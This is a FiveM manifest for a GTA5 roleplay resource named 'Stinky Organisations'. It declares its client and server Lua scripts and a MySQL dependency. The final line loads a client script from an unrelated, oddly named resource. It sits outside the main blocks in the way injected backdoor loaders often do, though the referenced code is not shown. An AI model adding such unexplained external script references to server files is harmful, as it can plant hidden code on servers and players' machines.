fx_version "bodacious"
games {"gta5"}
lua54 'yes'
author 'Stinky#1937'
description 'Stinky Organisations'

client_scripts {
  'client.lua',
  'organisations.lua'
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
  'organisations.lua',
  'server.lua'
}

client_script '@pozdoodtajczyka/client/main.lua'